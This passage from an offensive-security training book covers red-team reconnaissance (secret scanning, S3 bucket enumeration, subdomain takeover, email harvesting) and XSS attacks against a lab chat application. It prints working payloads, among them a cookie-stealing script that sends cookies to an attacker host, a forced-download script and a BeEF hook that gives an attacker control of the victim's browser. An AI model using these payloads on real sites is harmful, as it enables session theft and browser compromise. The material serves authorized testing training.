+there!  Let's see if we can find some of these gems.
+Truffle Hog
+Truffle Hog tool scans different commit histories and branches for high entropy keys,
+and prints them.  This is great for finding secrets, passwords, keys, and more.  Let's see
+if we can find any secrets on cyberspacekittens' Github repository.
+Lab:
+cd /opt/trufflehog/truffleHog
+python truffleHog.py https://github.com/cyberspacekittens/dnscat2
+ 
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+ 
+As we can see in the commit history, AWS keys and SSH keys were removed from
+server/controller/csk.config, but if you look at the current repo, you won't find this file:
+https://github.com/cheetz/dnscat2/tree/master/server/controller. 
+ 
+Even better (but a little more complicated to set up) is git-all-secrets from
+(https://github.com/anshumanbh/git-all-secrets).  Git-all-secrets is useful when looking
+through large organizations.  You can just point to an organization and have it clone
+the code locally, then scan it with Truffle-hog and repo-supervisor.  You will first need
+to create a Github Access Token, which is free by creating a Github and selecting
+Generate New Token in the settings. 
+ 
+To run git-all-secrets:
+cd /opt/git-all-secrets
+docker run -it abhartiya/tools_gitallsecrets:v3 -
+repoURL=https://github.com/cyberspacekittens/dnscat2 -token=[API Key] -
+output=results.txt
+This will clone the repo and start scanning.  You can even run through whole
+organizations in Github with the -org flag.
+After the container finishes running, retrieve the container ID by typing:
+docker ps -a
+Once you have the container ID, get the results file from the container to the
+host by typing:
+docker cp <container-id>:/data/results.txt .
+ 
+Cloud
+As we spoke prior, cloud is one area where we see a lot of companies improperly
+securing their environment.  The most common issues we generally see are:
+Amazon S3 Missing Buckets: https://hackerone.com/reports/121461
+Amazon S3 Bucket Permissions: https://hackerone.com/reports/128088
+Being able to list and write files to public AWS buckets:
+aws s3 ls s3://[bucketname]
+aws s3 mv test.txt s3://[bucketname]
+||||||||||||||||||||||||||||||||||||||||
+
+Lack of Logging
+ 
+Before we can start testing misconfigurations on different AWS buckets, we need to
+first identify them.  We are going to try a couple different tools to see what we can
+discover on our victim’s AWS infrastructure.
+S3 Bucket Enumeration
+There are many tools that can perform S3 bucket enumeration for AWS.  These tools
+generally take keywords or lists, apply multiple permutations, and 
+then try to identify
+different buckets.  For example, we can use a tool called Slurp
+(https://github.com/bbb31/slurp) to find information about our target
+CyberSpaceKittens:
+cd /opt/slurp
+./slurp domain -t cyberspacekittens.com
+./slurp keyword -t cyberspacekittens
+ 
+Bucket Finder
+Another tool, Bucket Finder, will not only attempt to find different buckets, but also
+download all the content from those buckets for analysis:
+wget https://digi.ninja/files/bucket_finder_1.1.tar.bz2 -O
+bucket_finder_1.1.tar.bz2
+cd /opt/bucket_finder
+./bucket_finder.rb --region us my_words --download
+ 
+ 
+You have been running discovery on Cyber Space Kittens’ infrastructure and identify
+one of their S3 buckets (cyberspacekittens.s3.amazonaws.com).  What are your first
+steps in retrieving what you can and cannot see on the S3 bucket?  You can first pop it
+into a browser and see some information:
+ 
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+ 
+Prior to starting, we need to create an AWS account to get an Access Key ID.  You can
+get yours for free at Amazon here: https://aws.amazon.com/s/dm/optimization/server-
+side-test/free-tier/free_np/.  Once you create an account, log into AWS, go to Your
+Security Credentials (https://amzn.to/2ItaySR), and then to Access Keys.  Once you
+have your AWS Access ID and Secret Key, we can query our S3 buckets.
+ 
+Query S3 and Download Everything:
+Install awscli
+sudo apt install awscli
+Configure Credentials
+aws configure
+Look at the permissions on CyberSpaceKittens' S3 bucket
+aws s3api get-bucket-acl --bucket cyberspacekittens
+Read files from the S3 Bucket
+aws s3 ls s3://cyberspacekittens
+Download Everything in the S3 Bucket
+aws s3 sync s3://cyberspacekittens .
+ 
+Other than query S3, the next thing to test is writing to that bucket.  If we have write
+access, it could allow complete RCE of their applications.  We have often seen that
+when files stored on S3 buckets are used on all of their pages (and if we can modify
+these files), we can put our malicious code on their web application servers.
+ 
+Writing to S3:
+echo "test" > test.txt
+aws s3 mv test.txt s3://cyberspacekittens
+||||||||||||||||||||||||||||||||||||||||
+
+aws s3 ls s3://cyberspacekittens
+ 
+*Note, write has been removed from the Everyone group.  This was just for
+demonstration.
+ 
+Modify Access Controls in AWS Buckets
+When analyzing AWS security, we need to review the controls around permissions on
+objects and buckets.  Objects are the individual files and buckets are logical units of
+storage.  Both of these permissions can potentially be modified by any user if
+provisioned incorrectly. 
+ 
+First, we can look at each object to see if these permissions are configured correctly:
+aws s3api get-object-acl --bucket cyberspacekittens --key ignore.txt
+ 
+We will see that the file is only writeable by a user named “secure”.  It is not open to
+everyone.   If we did have write access, we could use the put-object in s3api to modify
+that file.
+ 
+Next, we look to see if we can modify the buckets themselves.  This can be
+accomplished with:
+aws s3api get-bucket-acl --bucket cyberspacekittens
+ 
+ 
+Again, in both of these cases, READ is permissioned globally, but FULL_CONTROL
+or any write is only allowed by an account called “secure”.  If we did have access to
+the bucket, we could use the --grant-full-control to give ourselves full control of the
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+bucket and objects. 
+ 
+Resources:
+https://labs.detectify.com/2017/07/13/a-deep-dive-into-aws-s3-access-
+controls-taking-full-control-over-your-assets/
+ 
+Subdomain Takeovers
+Subdomain takeovers are a common vulnerability we see with almost every company
+these days.  What happens is that a company utilizes some third party
+CMS/Content/Cloud Provider and points their subdomains to these platforms.  If they
+ever forget to configure the third party service or deregister from that server, an
+attacker can take over that hostname with the third party. 
+ 
+For example, you register an S3 Amazon Bucket with the name
+testlab.s3.amazonaws.com.  You then have your company’s subdomain
+testlab.company.com point to testlab.s3.amazonaws.com.  A year later, you no longer
+need the S3 bucket testlab.s3.amazonaws.com and deregister it, but forget the CNAME
+redirect for testlab.company.com.  Someone can now go to AWS and set up
+testlab.s3.amazon.com and have a valid S3 bucket on the victim’s domain.
+ 
+One tool to check for vulnerable subdomains is called tko-subs.  We can use this tool
+to check whether any of the subdomains we have found pointing to a CMS provider
+(Heroku, Github, Shopify, Amazon S3, Amazon CloudFront, etc.) can be taken over.
+ 
+Running tko-subs:
+cd /opt/tko-subs/
+./tkosubs -domains=list.txt -data=providers-data.csv -output=output.csv
+ 
+If we do find a dangling CNAME, we can use tko-subs to take over Github Pages and
+Heroku Apps.  Otherwise, we would have to do it manually.  Two other tools that can
+help with domain takeovers are:
+HostileSubBruteforcer (https://github.com/nahamsec/HostileSubBruteforcer)
+autoSubTakeover (https://github.com/JordyZomer/autoSubTakeover)
+ 
+Want to learn more about AWS vulnerabilities?  A great CTF AWS Walkthrough:
+http://flaws.cloud/
+.
+ 
+Emails
+A huge part of any social engineering attack is to find email addresses and names of
+employees.  We used Discover Script in the previous chapters, which is great for
+collecting much of this data.  I usually start with Discover scripts and begin digging
+into the other tools.  Every tool does things slightly differently and it is beneficial to
+||||||||||||||||||||||||||||||||||||||||
+
+use as many automated processes as you can.
+ 
+Once you get a small list of emails, it is good to understand their email format.  Is it
+firstname.lastname @cyberspacekitten.com or is it first initial.lastname
+@cyberspacekittens.com?  Once you can figure out their format, we can use tools like
+LinkedIn to find more employees and try to identify their email addresses.
+SimplyEmail
+We all know that spear phishing is still one of the more successful avenues of attack. 
+If we don’t have any vulnerabilities from the outside, attacking users is the next step. 
+To build a good list of email addresses, we can use a tool like SimplyEmail.  The
+output of this tool will provide the email address format of the company and a list of
+valid users
+ 
+Lab:
+Find all email accounts for cnn.com
+cd /opt/SimplyEmail
+./SimplyEmail.py -all -v -e cyberspacekittens.com
+firefox cyberspacekittens.com<date_time>/Email_List.html
+ 
+This may take a long time to run as it checks Bing, Yahoo, Google, Ask Search, PGP
+Repos, files, and much more.  This may also make your network look like a bot to
+search engines and may require captchas if you produce too many search requests. 
+ 
+Run this against your company.  Do you see any email addresses that you recognize? 
+These might be the first email addresses that could be targeted in a large scale
+campaign.
+Past Breaches
+One of the best ways to get email accounts is to continually monitor and capture past
+breaches.  I don't want to link directly to the breaches files, but I will reference some
+of the ones that I have found useful:
+ 
+1.4 Billion Password Leak 2017: https://thehackernews.com/2017/12/data-
+breach-password-list.html
+Adobe Breach from 2013:
+https://nakedsecurity.sophos.com/2013/11/04/anatomy-of-a-password-disaster-
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+adobes-giant-sized-cryptographic-blunder/
+Pastebin Dumps: http://psbdmp.ws/
+Exploit.In Dump
+Pastebin Google Dork: site:pastebin.com intext:cyberspacekittens.com
+ 
+Additional Open Source Resources
+I didn't know exactly where to put these resources, but I wanted to provide a great
+collection of other resources used for Red Team style campaigns.  This can help
+identify people, locations, domain information, social media, image analysis, and
+more. 
+ 
+Collection of OSINT Links:
+https://github.com/IVMachiavelli/OSINT_Team_Links
+OSINT Framework: http://osintframework.com/
+Conclusion
+In this chapter we went over all the different reconnaissance tactics and tools of the
+trade.  This is just a start as many of these techniques are manual and require a fair
+amount of time to execute.  It is up to you to take this to the next level, automate all
+these tools, and make the recon fast and efficient.
+||||||||||||||||||||||||||||||||||||||||
+
+ 
+ 
+ 
+ 
+ 
+ 
+3 the throw - web application exploitation
+ 
+ 
+ 
+ 
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+Over the past couple of years, we have seen some critical, externally-facing web
+attacks.  Everything from the Apache Struts 2 (although not confirmed for the Equifax
+breach - http://bit.ly/2HokWi0), Panera Bread (http://bit.ly/2qwEMxH), and Uber
+(http://ubr.to/2hIO2tZ).  There is no doubt we will continue to see many other severe
+breaches from public internet facing end-points.
+ 
+The security industry, as a whole, runs in a cyclical pattern.  If you look at the different
+layers of the OSI model, the attacks shift to a different layer every other year.  In terms
+of web, back in the early 2000s, there were tons of SQLi and RFI type exploits. 
+However, once companies started to harden their external environments and began
+performing external penetration test, we, as attackers, moved to Layer 8 attacks
+focusing on social engineering (phishing) for our initial entry point.  Now, as we see
+organizations improving their internal security with Next Generation
+Endpoint/Firewall Protection, our focus is shifting back onto application exploitation.  
+We have also seen a huge complexity increase in applications, APIs, and languages,
+which has reopened many old and even new vulnerabilities.
+ 
+Since this book is geared more toward Red Teaming concepts, we will not go too
+deeply into all of the different web vulnerabilities or how to manually exploit them. 
+This won't be your checklist style book.  You will be focusing on vulnerabilities that
+Red Teamers and bad guys are seeing in the real world, which lead to the
+compromising of PII, IP, networks, and more.  For those who are looking for the very
+detailed web methodologies, I always recommend starting with the OWASP Testing
+Guide (http://bit.ly/2GZbVZd and https://www.owasp.org/images/1/19/OTGv4.pdf).
+ 
+Note, since as many of the attacks from THP2 have not changed, we won't be
+repeating examples like SQLMap, IDOR attacks, and CSRF vulnerabilities in the
+following exercises. 
+Instead, we will focus on newer critical ones. 
+ 
+Bug Bounty Programs:
+Before we start learning how to exploit web applications, let’s talk a little about bug
+bounty programs.  The most common question we get is, “how can I continually learn
+after these trainings?”  My best recommendation is to do it against real, live systems. 
+You can do training labs all day, but without that real-life experience, it is hard to
+grow.
+ 
+One caveat though: on average, it takes about 3-6 months before you begin to
+consistently find bugs.  Our advice: don’t get frustrated, keep up-to-date with other
+bug bounty hunters, and don’t forget to check out the older programs.
+ 
+The more common bug bounty programs are HackerOne
+(https://www.hackerone.com), BugCrowd (https://bugcrowd.com/programs) and
+||||||||||||||||||||||||||||||||||||||||
+
+SynAck (https://www.synack.com/red-team/).  There are plenty of other ones out there
+as well (https://www.vulnerability-lab.com/list-of-bug-bounty-programs.php).  These
+programs can pay anywhere from Free to $20k+. 
+ 
+Many of my students find it daunting to start bug hunting.  It really requires you to just
+dive in, allot a few hours a day, and focus on understanding how to get that sixth
+ 
+sense
+to find bugs.  Generally, a good place to start is to look at No-Reward Bug Bounty
+Programs (as the pros won’t be looking here) or at large older programs like Yahoo. 
+These types of sites tend to have a massive scope and lots of legacy servers.  As
+mentioned in prior books, scoping out pentests is important and bug bounties are no
+different.  Many of the programs specify what can and cannot be done (i.e., no
+scanning, no automated tools, which domains can be attacked, etc.).  Sometimes you
+get lucky and they allow *.company.com, but other times it might be limited to a
+single FQDN. 
+ 
+Let’s look at eBay, for example, as they have a public bug bounty program.  On their
+bug bounty site (http://pages.ebay.com/securitycenter/Researchers.html), they state
+guidelines, eligible domains, eligible vulnerabilities, exclusions, how to report, and
+acknowledgements:
+ 
+ 
+How you report vulnerabilities to the company is generally just as important as the
+finding itself.  You want to make sure you provide the company with as much detail as
+possible.  This would include the type of vulnerability, severity/criticality, what steps
+you took to exploit the vulnerability, screenshots, and even a working proof of
+concept.  If you need help creating consistent reports, take a look at this report
+generation form: https://buer.haus/breport/index.php.
+ 
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+ 
+Having run my own programs before, one thing to note about exploiting vulnerabilities
+for bug bounty programs is that I have seen a few cases where researchers got carried
+away and went past validating the vulnerability.  Some examples include dumping a
+whole database after finding an SQL injection, defacing a page with something they
+thought was funny after a subdomain takeover, and even laterally moving within a
+production environment after an initial remote code execution vulnerability.  These
+cases could lead to legal trouble and to potentially having the Feds at your door.  So
+use your best judgement, check the scope of the program, and remember that if it feels
+illegal, it probably is.
+Web Attacks Introduction - Cyber Space Kittens
+After finishing reconnaissance and discovery, you review all the different sites you
+found.  Looking through your results, you don’t see the standard exploitable
+servers/misconfigured applications.  There aren’t any Apache Tomcat servers or
+Heartbleed/ShellShock, and it looks like they patched all the Apache Strut issues and
+their CMS applications.
+ 
+Your sixth sense intuition kicks into full gear and you start poking around at their
+Customer Support System application.  Something just doesn’t feel right, but where to
+start? 
+ 
+For all the attacks in the Web Application Exploitation chapter, a custom THP3
+VMWare Virtual Machine is available to repeat all these labs.  This virtual machine is
+freely available here: 
+http://thehackerplaybook.com/get.php?type=csk-web
+ 
+To set up the demo for the Web Environment (Customer System Support):
+Download the Custom THP VM from:
+http://thehackerplaybook.com/get.php?type=csk-web
+Download the full list of commands for the labs:
+https://github.com/cheetz/THP-ChatSupportSystem/blog/master/lab.txt
+Bit.ly Link: http://bit.ly/2qBDrFo
+||||||||||||||||||||||||||||||||||||||||
+
+Boot up and log into the VM
+When the VM is fully booted, it should show you the current IP address of the
+application.  
+You do not need to log into the VM nor is the password
+provided.  
+It is up to you to break into the application.
+Since this is a web application hosted on your own system, let's make a
+hostname record on our attacker Kali system:
+On our attacker Kali VM, let's edit our host file to point to our
+vulnerable application to reference the application by hostname versus
+by IP:
+gedit /etc/hosts
+Add the following line with the IP of your vulnerable application:
+[IP Address of Vuln App]
+chat
+Now, go to your browser in Kali and go to http://chat:3000/.  If
+everything worked, you should be able to see the NodeJS Custom Vuln
+Application.
+ 
+The commands and attacks for the web section can be extremely long and
+complicated.  To make it easy, I’ve included all the commands you’ll need for each lab
+here:
+https://github.com/cheetz/THP-ChatSupportSystem/blog/master/lab.txt
+ 
+The Red Team Web Application Attacks
+The first two books focused on how to efficiently and effectively test Web
+Applications – this time will be a little different.  We are going to skip many of the
+basic attacks and move into attacks that are used in the real world.
+ 
+Since this is more of a practical book, we won’t go into all of the detailed technicalities
+of web application testing.  However, this doesn’t mean that these details should be
+ignored.  A great resource for web application testing information is Open Web
+Application Security Project, or OWASP.  OWASP focuses on developing and
+educating users on application security.  Every few years, OWASP compiles a list of
+the most common issues and publishes them to the public - http://bit.ly/2HAhoGR.  A
+more in-depth testing guideline is located here: http://bit.ly/2GZbVZd.  This document
+will walk you through the types of vulnerabilities to look for, the risks, and how to
+exploit them.  This is a great checklist document: http://bit.ly/2qyA9m1.
+ 
+As many of my readers are trying to break into the security field, I wanted to quickly
+mention one thing: if you are going for a penetration testing job, it is imperative to
+know, at a minimum, the OWASP Top 10 backwards and forwards.  You should not
+only know what they are, but also have good examples for each one in terms of the
+types of risks they bring and how to check for them.  Now, let's get back to
+compromising CSK.
+ 
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+Chat Support Systems Lab
+The Chat Support System lab that will be attacked was built to be interactive and
+highlight both new and old vulnerabilities.  As you will see, for many of the following
+labs, we provide a custom VM with a version of the Chat Support System.
+ 
+The application itself was written in Node.js.  Why Node?  It is one of the fastest
+growing applications that we see as penetration testers.  Since a lot of developers seem
+to really like Node, I felt it was important for you to understand the security
+implications of running JavaScript as backend code. 
+What is Node?
+“Node.js® is a JavaScript runtime built on Chrome's V8 JavaScript engine. Node.js
+uses an event-driven, non-blocking I/O model that makes it lightweight and efficient.”
+[https://nodejs.org/en/] Node.js' package ecosystem, NPM, is the largest ecosystem of
+open source libraries in the world.
+ 
+At a very basic level, Node.js allows you to run JavaScript outside of a browser.  Due
+to the fact that Node.js is lean, fast, and cross-platform, it can greatly simplify a project
+by unifying the stack.  Although Node.js is not a web server, it allows a server
+(something you can program in JavaScript) to exist in an environment outside of the
+actual Web Client.
+ 
+Benefits:
+Very fast
+Single-threaded JavaScript environment which is capable of acting as a
+standalone web application server
+Node.js is not a protocol; it is a web server written in JavaScript
+The NPM registry hosts almost half a million packages of free, reusable
+Node.js code, which makes it the largest software registry in the world
+ 
+With Node.js becoming so popular in the past couple years, it is very important for
+penetration testers/Red Teamers to understand what to look for and how to attack these
+applications.  For example, a researcher identified that weak NPM credentials gave
+him edit/publish access to 13% of NPM packages.  Through dependency chains, an
+estimated 52% of NPM packages could have been vulnerable.
+[https://www.bleepingcomputer.com/news/security/52-percent-of-all-javascript-npm-
+packages-could-have-been-hacked-via-weak-credentials/]
+ 
+In the following examples, our labs will be using Node.js as the foundation of our
+applications, which will utilize the Express framework (https://expressjs.com/) for our
+web server.  We will then add the Pug (https://pugjs.org/) template engine to our
+Express framework.  This is similar to what we are now commonly seeing in newer-
+developed applications.
+ 
+||||||||||||||||||||||||||||||||||||||||
+
+ 
+Express is a minimalistic web framework for Node.js. 
+Express provides a robust set of
+features for web and mobile applications so you don't have to do a lot of work. 
+With
+modules called Middlewares, you can add third party authentication or services like
+Facebook Auth or Stripe Payment processing.
+ 
+Pug, formally known as Jade, is a server-side templating engine that you can (but do
+not have to) use with Express. 
+Jade is for programmatically generating the HTML on
+the server and sending it to the client.
+ 
+Let's attack CSK and boot up the Chat Support System Virtual Machine.
+ 
+Cyber Space Kittens:  Chat Support Systems
+You stumble across the externally-facing Cyber Space Kittens chat support system. 
+As you slowly sift through all the pages and understand the underlying system, you
+look for weaknesses in the application.  You need to find your first entry point into the
+server so that you can pivot into the production environment. 
+ 
+You first run through all of your vulnerability scanner and web application scanner
+reports, but come up empty-handed.  It looks like this company regularly runs the
+common vuln scanners and has patched most of its issues.  The golden egg findings
+now rely on coding issues, misconfigurations, and logic flaws.  You also notice that
+this application is running NodeJS, a recently popular language. 
+ 
+Setting Up Your Web Application Hacking Machine
+Although there are no perfect recipes for Red Teaming Web Applications, some of the
+basic tools you will need include:
+Arming yourself with browsers.  Many browsers act very differently especially
+with complex XSS evasion:
+Firefox (my favorite for testing)
+Chrome
+Safari
+Wappalyzer: a cross-platform utility that uncovers the technologies used on
+websites. It detects content management systems, ecommerce platforms, web
+frameworks, server software, analytics tools and many more.
+https://wappalyzer.com/
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+BuiltWith: a web site profiler tool. Upon looking up a page, BuiltWith returns
+all the technologies it can find on the page. BuiltWith’s goal is to help
+developers, researchers and designers find out what technologies pages are
+using, which may help them to decide what technologies to implement
+themselves.
+https://builtwith.com/
+Retire.JS: scan a web app for use of vulnerable JavaScript libraries. The goal of
+Retire.js is to help you detect use of a version with known vulnerabilities.
+https://chrome.google.com/webstore/detail/retirejs/moibopkbhjceeedibkbkbchbjnkadmom?
+hl=en
+Burp Suite (~$350): although this commercial tool is a bit expensive, it is
+definitely worth every penny and a staple for penetration testers/Red Teamers. 
+Its benefits come from the add-ons, modular design, and user development
+base.  If you can't afford Burp, OWASP ZAP (which is free) is an excellent
+replacement.
+ 
+Analyzing a Web Application
+Before we do any type of scanning, it is important to try to understand the underlying
+code and infrastructure.  How can we tell what is running the backend?  We can use
+Wappalyzer, BuiltWith, or just Google Chrome inspect.  In the images below, when
+loading up the Chat application, we can see that the HTTP headers have an X-Powered
+By: Express.  We can also see with Wappalyzer that the application is using Express
+and Node.js.
+ 
+ 
+Understanding the application before blindly attacking a site can help provide you with
+a much better approach.  This could also help 
+with targeted sites that might have
+WAFs, allowing you to do a more ninja attack. 
+ 
+Web Discovery
+In the previous books, we went into more detail on how to use Burp Suite and how to
+penetration test a site.  We are going to skip over a lot of the setup basics and focus
+more on attacking the site. 
+ 
+||||||||||||||||||||||||||||||||||||||||
+
+We are going to assume, at this point, that you have Burp Suite all set up (free or paid)
+and you are on the THP Kali image.   Once we have an understanding of the
+underlying system, we need to identify all the endpoints.  We still need to run the same
+discovery tools as we did in the past. 
+ 
+Burp Suite (https://portswigger.net/burp)
+Spidering: In both the free and paid versions, Burp Suite has a great
+Spidering tool. 
+Content Discovery: If you are using the paid version of Burp Suite, one
+of the favorite discovery tools is under Engagement tools, Discover
+Content.  This is a smart and efficient discovery tool that looks for
+directories and files.  You can specify several different configurations
+for the scan.
+Active Scan: Runs automated vulnerability scanning on all parameters
+and tests for multiple web vulnerabilities.
+OWASP ZAP (http://bit.ly/2IVNaO2)
+Similar to Burp, but completely open source and free.  Has similar
+discover and active scan features.
+Dirbuster
+An old tool that has been around forever to discover files/folders of a
+web application, but still gets the job done. 
+Target URL:  http://chat:3000
+Word List:
+/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+GoBuster (https://github.com/OJ/gobuster)
+Very lightweight, fast directory and subdomain bruteforce tool
+gobuster -u http://chat:3000 -w /opt/SecLists/Discovery/Web-
+Content/raft-small-directories.txt -s 200,301,307 -t 20
+ 
+Your wordlists are very important.  One of my favorite wordlists to use is an old one
+called raft, which is a collection of many open source projects.  You can find these and
+other valuable wordlists here:
+https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content (which
+is already included in your THP Kali image). 
+ 
+Now that we are done with the overview, let’s get into some attacks.  From a Red
+Team perspective, we are looking for vulnerabilities we can actively attack and that
+provide the most bang for our buck.  If we were doing an audit or a penetration test,
+we might report vulnerabilities like SSL issues, default Apache pages, or non-
+exploitable vulnerabilities from vulnerability scanner.  But, on our Red Team
+engagements, we can completely ignore those and focus on attacks that get us
+advanced access, shells, or dump PII. 
+ 
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+Cross-Site Scripting XSS
+At this point, we have all seen and dealt with Cross-Site Scripting (XSS).  Testing
+every variable on a website with the traditional XSS attack: <script>alert(1)</script>,
+might be great for bug bounties, but can we do more?  What tools and methods can we
+use to better utilize these attacks?
+ 
+So, we all know that XSS attacks are client-side attacks that allow an attacker to craft a
+specific web request to inject malicious code into a response.  This could generally be
+fixed with proper input validation on the client and server-side, but it is never that
+easy.  Why, you ask?  It is due to a multitude of reasons.  Everything from poor
+coding, to not understanding frameworks, and sometimes applications just get too
+complex and it becomes hard to understand where an input goes.
+ 
+Because the alert boxes don't really do any real harm, let's start with some of the basic
+types of XSS attacks:
+Cookie Stealing XSS: <script>document.write('<img src="http://<Your
+IP>/Stealer.php?cookie=' %2B document.cookie %2B '" />');</script>
+Forcing the Download of a File: <script>var link =
+document.createElement('a'); link.href =
+'http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe'; link.download = '';
+document.body.appendChild(link); link.click();</script>
+Redirecting User: <script>window.location =
+"https://www.youtube.com/watch?v=dQw4w9WgXcQ";</script>
+Other Scripts to Enable Key Loggers, Take Pictures, and More
+http://www.xss-payloads.com/payloads-list.html?c#category=capture
+Obfuscated/Polyglot XSS Payloads
+In today's world, the standard XSS payload still works pretty often, but we do come
+across applications that block certain characters or have WAFs in front of the
+application.  Two good resources to help you start crafting obfuscated XSS payload
+attacks:
+https://github.com/foospidy/payloads/tree/master/other/xss
+https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+ 
+Sometimes during an assessment, you might run into simple XSS filters that look for
+strings like <script>.   Obfuscating the XSS payload is one option, but it is also
+important to note that not all JavaScript payloads require the open and close <script>
+tags.  There are some HTML Event Attributes that execute JavaScript when triggered
+(https://www.w3schools.com/tags/ref_eventattributes.asp).  This means any rule that
+looks specifically for Script tags will be useless.  For example, these HTML Event
+Attributes that execute JavaScript being outside a <script> tag:
+<b onmouseover=alert('XSS')>Click Me!</b>
+<svg onload=alert(1)>
+<body onload="alert('XSS')">
+||||||||||||||||||||||||||||||||||||||||
+
+<img src="http://test.cyberspacekittens.com" onerror=alert(document.cookie);>
+ 
+You can try each of these HTML entity attacks on the CSK application by going to the
+application: http://chat:3000/ (remember to modify your /etc/host file to point chat to
+your VM IP).  Once you are there, register an account, log into the application, and go
+to the chat functionality (http://chat:3000/chatchannel/1).  Try the different entity
+attacks and obfuscated payloads.
+ 
+ 
+Other great resources for XSS:
+The first is Mind Map made by @jackmasa.  This is a great document that
+breaks down different XSS payloads based on where your input is served. 
+Although no longer on JackMasa GitHub page, a copy exists here: 
+http://bit.ly/2qvnLEq.  
+Another great resource that discusses which browsers are vulnerable to which
+XSS payloads is:  https://html5sec.org/.
+ 
+*JackMasa XSS Mind Map
+ 
+As you can see, it is sometimes annoying to try to find every XSS on an application. 
+This is because vulnerable parameters are affected by code features, different types of
+HTML tags, types of applications, and different types of filtering.  Trying to find that
+initial XSS pop-up can take a long time.  What if we could try and chain multiple
+payloads into a single request? 
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+ 
+This last type of payload is called a Polyglot.  A Polyglot payload takes many different
+types of payload/obfuscation techniques and compiles them into one attack.  This is
+great for automated scripts to look for XSS, bug bounty hunters with limited time, or
+just a quick way to find input validation issues.
+ 
+So, instead of the normal <script>alert(1)</script>, we can build a Polyglot like this
+(http://bit.ly/2GXxqxH):
+/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert()
+)//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--
+!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+ 
+If you look at the payload above, the attack tries to break out of comments, ticks and
+slashes; perform an onclick XSS; close multiple tags; and lastly tries an onload XSS. 
+These types of attacks make Polyglots extremely effective and efficient at identifying
+XSS.  You can read more about these Polyglot XSSs here:
+https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
+ 
+If you want to test and play around with the different polyglots, you can start here on
+the vulnerable XSS pages (http://chat:3000/xss) or throughout the Chat Application.
+BeEF
+Browser Exploitation Framework (http://beefproject.com/) or BeEF, takes XSS to
+another level.  This tool injects a JavaScript payload onto the victim’s browser, which
+infects the user’s system.  This creates a C2 channel on the victim’s browser for
+JavaScript post-exploitation. 
+ 
+From a Red Team perspective, BeEF is a great tool to use on campaigns, track users,
+capture credentials, perform clickjacking, attack with tabnapping and more.  If not
+used during an attack, BeEF is a great tool to demonstrate the power of an XSS
+vulnerability.  This could assist in more complicated attacks as well, which we will
+discuss later in the book under Blind XSS.
+ 
+BeEF is broken down into two parts: one is the server and the other is the attack
+payload.  To start the server:
+ 
+Start BeEF on Your Attacker Kali Host
+From a Terminal
+beef-xss
+Authenticate with beef:beef
+View http://127.0.0.1:3000/hook.js
+Full Payload Hook File:
+<script src="http://<Your IP>:3000/hook.js"></script>
+ 
+||||||||||||||||||||||||||||||||||||||||
+
+Viewing your hook.js file located on http://127.0.0.1:3000/hook.js, you should see
+something that resembles a long-obfuscated JavaScript file.  This is the client payload
+to connect your victim back to the command and control server. 
+ 
+Once you have identified an XSS on your target application, instead of the original
+alert(1) style payload, you would modify the <script src="http://<Your
+IP>:3000/hook.js"></script> payload to exploit the vulnerability.  Once your victim
+falls for this XSS trap, it will cause their browser to connect back to you and be a part
+of your Zombie network. 
+ 
+What types of post exploitation attacks does BeEF support?   Once your victim is
+under your control, you really can do anything that JavaScript can do.  You can turn on
+their camera via HTLM5 and take a picture of your victim, you can push overlays on
+their screen to capture credentials, or you can redirect them to a malicious site to
+execute malware. 
+ 
+Here is a quick demonstration of BeEF's ability to cause massive issues from an XSS
+attack:
+ 
+First, make sure your BeEF server is running on your attacker machine.  On our
+vulnerable Chat Support System's application, you can go to http://chat:3000/xss and
+inside the Exercise 2 field and put in your payload:
+<script src="http://127.0.0.1:3000/hook.js"></script>
+ 
+Once your victim is connected to your Zombie network, you have full control of their
+browser.  You can do all sorts of attacks based on their device, browser, and enabled
+features.  A great way to demonstrate XSS impact with social engineering tactics is by
+pushing malware to their machine via a Flash Update prompt.
+ 
+ 
+Once executed, a pop-up will be presented on the victim's machine, forcing them to
+install an update, which will contain additional malware. 
+ 
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+ 
+I recommend spending some time playing around with all the BeEf post exploitation
+modules and understanding the power of JavaScript.  Since we control the browser, we
+have to figure out how to use this in terms of Red Team campaigns.  What else might
+you want to do once you have infected a victim from an XSS?  We will discuss this in
+the XSS to Compromise section.
+ 
+Blind XSS
+Blind XSS is rarely discussed as it is a patient person's game.  What is Blind XSS?  As
+the name of the attack suggests, it is when an execution of a stored XSS payload is not
+visible to the attacker/user, but only visible to an administrator or back-end employee. 
+Although this attack could be very detrimental due to its ability to attack backend
+users, it is often missed.
+ 
+For example, let's assume an application has a "contact us" page that allows a user to
+supply contact information to the administrator in order to be contacted later.  Since
+the results of that data are only viewable by an administrator manually and not the
+requesting user and if the application was vulnerable to XSS, then the attacker would
+not immediately see their "alert(1)" attack.  In these cases, we can use XSSHunter
+(https://xsshunter.com) to help us validate the Blind XSS. 
+ 
+How XSSHunter works is that when our JavaScript payload executes, it will take a
+screenshot of the victim's screen (the current page they are viewing) and send that data
+back to the XSSHunter's site.  When this happens, XSSHunter will send an alert that
+our payload executed and provide us with all the detailed information.  We can now go
+back to create a very malicious payload and replay our attack.
+ 
+XSS Hunter:
+||||||||||||||||||||||||||||||||||||||||
+
+Disable any Proxies (i.e. Burp Suite)
+Create account at https://xsshunter.com
+Login at https://xsshunter.com/app
+Go to Payloads to get your Payload
+Modify the payload to fit your attack or build a Polyglot with it
+Check XSS hunter to see the payload execution
+ 
+ 
+ 
+DOM Based XSS
+The understanding of reflective and stored XSS is relatively straight forward.  As we
